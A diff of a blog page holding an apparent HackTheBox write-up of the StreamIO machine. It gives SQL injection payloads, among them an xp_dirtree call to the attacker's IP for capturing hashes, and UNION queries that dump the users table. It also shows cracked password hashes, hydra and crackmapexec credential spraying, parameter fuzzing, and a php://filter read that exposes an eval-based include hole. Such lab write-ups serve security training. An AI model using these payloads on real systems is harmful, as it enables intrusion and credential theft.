@@ -215,7 +215,158 @@ by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
 /*docroot*            (Status: 400) [Size: 3420]
 /*                    (Status: 400) [Size: 3420]
 /blocked.php          (Status: 200) [Size: 677]
-</code></pre><h2 id=foothold>Foothold</h2><ul><li>I registered on the <code>streamio.htb</code> but couldn&rsquo;t login</li></ul><p><img src=./images/4.png alt></p><p><img src=./images/5.png alt></p><p><img src=./images/6.png alt></p><ul><li>Clicking on <code>watch</code> button on <code>watch.streamio.htb</code> results in error</li></ul><p><img src=./images/8.png alt></p><ul><li>The website also has <code>blocked.php</code> endpoint<ul><li>Probably <code>WAF</code></li></ul></li></ul><p><img src=./images/7.png alt></p><h2 id=user>User</h2><h2 id=root>Root</h2></div><div class="row pl-3 pr-3"><div class="col-md-6 share-buttons"><strong>Share on:</strong>
+</code></pre><h2 id=foothold>Foothold</h2><ul><li>I registered on the <code>streamio.htb</code> but couldn&rsquo;t login</li></ul><p><img src=./images/4.png alt></p><p><img src=./images/5.png alt></p><p><img src=./images/6.png alt></p><ul><li>Clicking on <code>watch</code> button on <code>watch.streamio.htb</code> results in error</li></ul><p><img src=./images/8.png alt></p><ul><li>The website also has <code>blocked.php</code> endpoint<ul><li>Probably <code>WAF</code></li></ul></li></ul><p><img src=./images/7.png alt></p><ul><li>When we search for <code>dog</code>, it shows every movie containing &lsquo;dog&rsquo;</li></ul><p><img src=./images/9.png alt></p><ul><li>The same goes for <code>test</code></li></ul><p><img src=./images/10.png alt></p><ul><li>It looks like the query is <code>SELECT * FROM MOVIES WHERE NAME LIKE '%dog%';</code><ul><li>Thus if the statement is correct, we could try injecting <code>man';-- -</code></li><li>If the query is injectable, we should get all movies that end with <code>man</code><ul><li>There were no movies that end with <code>dog</code></li></ul></li></ul></li></ul><p><img src=./images/11.png alt></p><ul><li>And it works<ul><li>We could start with stealing the hash</li><li>Start <code>responder</code><ul><li><code>sudo responder -I tun0</code></li></ul></li><li>The payload<ul><li><code>man'; use master; exec xp_dirtree '\\10.10.16.4\anything';-- -</code></li></ul></li></ul></li></ul><p><img src=./images/12.png alt></p><ul><li>But <code>hashcat</code> has no results<ul><li><code>hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt</code></li><li>So let&rsquo;s try dumping the database<ul><li><a href=https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server target=_blank rel=noopener>https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server</a></li></ul></li><li>We can <code>UNION</code>-based injections<ul><li>But we have to find the number of collumns</li></ul></li><li>The final payload<ul><li><code>test' union select 1,2,3,4,5,6;-- -</code></li></ul></li></ul></li></ul><p><img src=./images/13.png alt></p><ul><li>We can use collumns <code>2</code> and <code>3</code> to dump the data<ul><li>Let&rsquo;s check the databases</li><li><code>test' union select 1,name,3,4,5,6 from master.dbo.sysdatabases;-- -</code></li></ul></li></ul><p><img src=./images/14.png alt></p><ul><li>Now we dump the tables<ul><li>Find the current database<ul><li><code>test' union select 1,(SELECT DB_NAME()),3,4,5,6;-- -</code></li></ul></li><li>Enumerate table names<ul><li><code>test' union select 1,name,id,4,5,6 FROM sysobjects WHERE xtype='U';-- -</code></li></ul></li></ul></li></ul><p><img src=./images/15.png alt></p><p><img src=./images/16.png alt></p><ul><li>Dump <code>users</code> table<ul><li>Find the columns<ul><li><code>test' union select 1,name,id,4,5,6 FROM syscolumns WHERE id = 901578250;-- -</code></li></ul></li><li>Dump the table<ul><li><code>test' union select 1,concat(username,':', password), 3,4,5,6 FROM users;-- -</code></li></ul></li></ul></li></ul><p><img src=./images/17.png alt></p><p><img src=./images/18.png alt></p><ul><li>Let&rsquo;s try cracking them</li></ul><pre tabindex=0><code>└─$ hashcat -m 0 user-hash.list /usr/share/wordlists/rockyou.txt --user       
+hashcat (v6.2.6) starting
+
+OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+==================================================================================================================================================
+* Device #1: pthread-sandybridge-12th Gen Intel(R) Core(TM) i5-12400, 1436/2936 MB (512 MB allocatable), 2MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 30 digests; 30 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+...
+
+3577c47eb1e12c8ba021611e1280753c:highschoolmusical        
+ee0b8a0937abd60c2882eacb2f8dc49f:physics69i               
+665a50ac9eaa781e4f7f04199db97a11:paddpadd                 
+b779ba15cedfd22a023c4d8bcf5f2332:66boysandgirls..         
+ef8f3d30a856cf166fb8215aca93e9ff:%$clara                  
+2a4e2cf22dd8fcb45adcb91be1e22ae8:$monique$1991$           
+54c88b2dbd7b1a84012fabc1a4c73415:$hadoW                   
+6dcd87740abb64edfa36d170f0d5450d:$3xybitch                
+08344b85b329d7efd611b7a7743e8a09:##123a8j8w5123##         
+b83439b16f844bd6ffe35c02fe21b3c0:!?Love?!123              
+b22abb47a02b52d5dfa27fb0b534f693:!5psycho8!               
+f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$               
+Approaching final keyspace - workload adjusted.           
+...
+</code></pre><pre tabindex=0><code>admin:665a50ac9eaa781e4f7f04199db97a11:paddpadd
+Barry:54c88b2dbd7b1a84012fabc1a4c73415:$hadoW
+Bruno:2a4e2cf22dd8fcb45adcb91be1e22ae8:$monique$1991$
+Clara:ef8f3d30a856cf166fb8215aca93e9ff:%$clara
+Juliette:6dcd87740abb64edfa36d170f0d5450d:$3xybitch
+Lauren:08344b85b329d7efd611b7a7743e8a09:##123a8j8w5123##
+Lenord:ee0b8a0937abd60c2882eacb2f8dc49f:physics69i
+Michelle:b83439b16f844bd6ffe35c02fe21b3c0:!?Love?!123
+Sabrina:f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$
+Thane:3577c47eb1e12c8ba021611e1280753c:highschoolmusical
+Victoria:b22abb47a02b52d5dfa27fb0b534f693:!5psycho8!
+yoshihide:b779ba15cedfd22a023c4d8bcf5f2332:66boysandgirls..
+</code></pre><ul><li>But none of them works for <code>smb</code></li></ul><pre tabindex=0><code>└─$ crackmapexec smb 10.10.11.158 -u user.list -p pass.list --no-bruteforce --continue-on-success
+SMB         10.10.11.158    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.158    445    DC               [-] streamIO.htb\admin:paddpadd STATUS_LOGON_FAILURE 
+SMB         10.10.11.158    445    DC               [-] streamIO.htb\Barry:$hadoW STATUS_LOGON_FAILURE 
+SMB         10.10.11.158    445    DC               [-] streamIO.htb\Bruno:$monique$1991$ STATUS_LOGON_FAILURE 
+SMB         10.10.11.158    445    DC               [-] streamIO.htb\Clara:%$clara STATUS_LOGON_FAILURE 
+SMB         10.10.11.158    445    DC               [-] streamIO.htb\Juliette:$3xybitch STATUS_LOGON_FAILURE 
+SMB         10.10.11.158    445    DC               [-] streamIO.htb\Lauren:##123a8j8w5123## STATUS_LOGON_FAILURE 
+SMB         10.10.11.158    445    DC               [-] streamIO.htb\Lenord:physics69i STATUS_LOGON_FAILURE 
+SMB         10.10.11.158    445    DC               [-] streamIO.htb\Michelle:!?Love?!123 STATUS_LOGON_FAILURE 
+SMB         10.10.11.158    445    DC               [-] streamIO.htb\Sabrina:!!sabrina$ STATUS_LOGON_FAILURE 
+SMB         10.10.11.158    445    DC               [-] streamIO.htb\Thane:highschoolmusical STATUS_LOGON_FAILURE 
+SMB         10.10.11.158    445    DC               [-] streamIO.htb\Victoria:!5psycho8! STATUS_LOGON_FAILURE 
+SMB         10.10.11.158    445    DC               [-] streamIO.htb\yoshihide:66boysandgirls.. STATUS_LOGON_FAILURE 
+</code></pre><ul><li>We could try the creds on <code>https://streamio.htb/login.php</code></li></ul><p><img src=./images/19.png alt></p><ul><li>Let&rsquo;s use <code>hydra</code></li></ul><pre tabindex=0><code>└─$ hydra -C user-pass.list streamio.htb https-post-form &#34;/login.php:username=^USER^&amp;password=^PASS^:F=Login failed&#34;
+Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-09-19 17:08:23
+[DATA] max 12 tasks per 1 server, overall 12 tasks, 12 login tries, ~1 try per task
+[DATA] attacking http-post-forms://streamio.htb:443/login.php:username=^USER^&amp;password=^PASS^:F=Login failed
+[4
+43][http-post-form] host: streamio.htb   login: yoshihide   password: 66boysandgirls..
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-09-19 17:08:27
+</code></pre><ul><li>We successfully login<ul><li>And now we have access to <code>admin</code></li></ul></li></ul><p><img src=./images/20.png alt></p><ul><li>We have nothing interesting,<ul><li>The url is <code>https://streamio.htb/admin/?staff=</code></li><li>When we click the panels, the parameter changes<ul><li><code>Staff Management -> https://streamio.htb/admin/?staff=</code></li><li><code>Movie Management -> https://streamio.htb/admin/?movie=</code></li><li><code>User Management -> https://streamio.htb/admin/?user=</code></li></ul></li><li>We can try fuzzing the parameter</li></ul></li></ul><pre tabindex=0><code>└─$ wfuzz -H &#34;Cookie: PHPSESSID=1oqkt97ah49htfg0tli8rsthor&#34; -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u &#39;https://streamio.htb/admin/?FUZZ=&#39; --hh 1678
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#39;s documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: https://streamio.htb/admin/?FUZZ=
+Total requests: 6453
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                    
+=====================================================================
+
+000001575:   200        49 L       137 W      1712 Ch     &#34;debug&#34;
+000003530:   200        10790 L    25878 W    320235 Ch   &#34;movie&#34;
+000005450:   200        398 L      916 W      12484 Ch    &#34;staff&#34;
+000006133:   200        62 L       160 W      2073 Ch     &#34;user&#34;
+
+Total time: 80.34713
+Processed Requests: 6453
+Filtered Requests: 6449
+Requests/sec.: 80.31400
+</code></pre><p><img src=./images/21.png alt></p><ul><li>I was stuck here for a while<ul><li>It looks like when I supply <code>index.php</code>, the page return error</li></ul></li></ul><p><img src=./images/22.png alt></p><ul><li>So it looks like I missed important endpoint<ul><li>From now on, I will use <code>feroxbuster</code> in the background, which performs recursive directory search</li></ul></li></ul><pre tabindex=0><code>└─$ feroxbuster -u https://streamio.htb -x php -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -k 
+
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben &#34;epi&#34; Risher 🤓                 ver: 2.10.0
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ https://streamio.htb
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
+ 👌  Status Codes          │ All Status Codes!
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.10.0
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🔎  Extract Links         │ true
+ 💲  Extensions            │ [php]
+ 🏁  HTTP methods          │ [GET]
+ 🔓  Insecure              │ true
+ 🔃  Recursion Depth       │ 4
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+301      GET        2l       10w      150c https://streamio.htb/admin =&gt; https://streamio.htb/admin/
+301      GET        2l       10w      151c https://streamio.htb/images =&gt; https://streamio.htb/images/
+301      GET        2l       10w      147c https://streamio.htb/js =&gt; https://streamio.htb/js/
+301      GET        2l       10w      148c https://streamio.htb/css =&gt; https://streamio.htb/css/
+200      GET      395l      915w    13497c https://streamio.htb/index.php
+200      GET      206l      430w     6434c https://streamio.htb/contact.php
+200      GET      231l      571w     7825c https://streamio.htb/about.php
+200      GET       51l      213w    19329c https://streamio.htb/images/client.jpg
+200      GET      101l      173w     1663c https://streamio.htb/css/responsive.css
+200      GET        5l      374w    21257c https://streamio.htb/js/popper.min.js
+200      GET      863l     1698w    16966c https://streamio.htb/css/style.css
+302      GET        0l        0w        0c https://streamio.htb/logout.php =&gt; https://streamio.htb/
+200      GET      192l     1006w    82931c https://streamio.htb/images/icon.png
+200      GET      111l      269w     4145c https://streamio.htb/login.php
+200      GET        2l     1276w    88145c https://streamio.htb/js/jquery-3.4.1.min.js
+200      GET      367l     1995w   166220c https://streamio.htb/images/contact-img.png
+200      GET      191l      253w     3120c https://streamio.htb/css/login.css
+200      GET      121l      291w     4500c https://streamio.htb/register.php
+301      GET        2l       10w      157c https://streamio.htb/admin/images =&gt; https://streamio.htb/admin/images/
+200      GET        0l        0w   233314c https://streamio.htb/images/about-img.png
+200      GET      395l      915w    13497c https://streamio.htb/
+301      GET        2l       10w      153c https://streamio.htb/admin/js =&gt; https://streamio.htb/admin/js/
+301      GET        2l       10w      154c https://streamio.htb/admin/css =&gt; https://streamio.htb/admin/css/
+301      GET        2l       10w      150c https://streamio.htb/fonts =&gt; https://streamio.htb/fonts/
+403      GET        1l        1w       18c https://streamio.htb/admin/index.php
+301      GET        2l       10w      156c https://streamio.htb/admin/fonts =&gt; https://streamio.htb/admin/fonts/
+200      GET      274l     1677w   150222c https://streamio.htb/images/barry.png
+200      GET     2059l    12754w  1028337c https://streamio.htb/images/samantha.png
+200      GET        0l        0w   478934c https://streamio.htb/images/oliver.png
+200      GET        2l        6w       58c https://streamio.htb/admin/master.php
+</code></pre><ul><li>Now, if I supply <code>master.php</code> to <code>debug</code><ul><li>It returns everything from <code>STREAMIO</code> database</li></ul></li></ul><p><img src=./images/23.png alt></p><ul><li>Let&rsquo;s use <code>php</code> filter to dump the source code<ul><li><code>https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=master.php</code></li></ul></li></ul><p><img src=./images/24.png alt></p><pre tabindex=0><code>└─$ echo &#34;...&#34; | base64 -d
+...
+&lt;?php
+if(isset($_POST[&#39;include&#39;]))
+{
+if($_POST[&#39;include&#39;] !== &#34;index.php&#34; ) 
+eval(file_get_contents($_POST[&#39;include&#39;]));
+else
+echo(&#34; ---- ERROR ---- &#34;);
+}
+?&gt;base64: invalid input
+</code></pre><ul><li>We have a <code>include</code> parameter which we can use<ul><li>It get the contents of the file and passes it to <code>eval</code></li><li>We could try <code>RFI</code></li></ul></li></ul><h2 id=user>User</h2><h2 id=root>Root</h2></div><div class="row pl-3 pr-3"><div class="col-md-6 share-buttons"><strong>Share on:</strong>
 <a class="btn btn-sm twitter-btn" href="https://twitter.com/share?url=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2fwindows%2fstreamio%2f&text=%5bHTB%5d%20Machine%3a%20StreamIO&via=Personal%20Blog" target=_blank><i class="fab fa-twitter"></i></a>
 <a class="btn btn-sm reddit-btn" href="https://reddit.com/submit?url=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2fwindows%2fstreamio%2f&title=%5bHTB%5d%20Machine%3a%20StreamIO" target=_blank><i class="fab fa-reddit"></i></a>
 <a class="btn btn-sm linkedin-btn" href="https://www.linkedin.com/shareArticle?url=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2fwindows%2fstreamio%2f&title=%5bHTB%5d%20Machine%3a%20StreamIO" target=_blank><i class="fab fa-linkedin"></i></a>
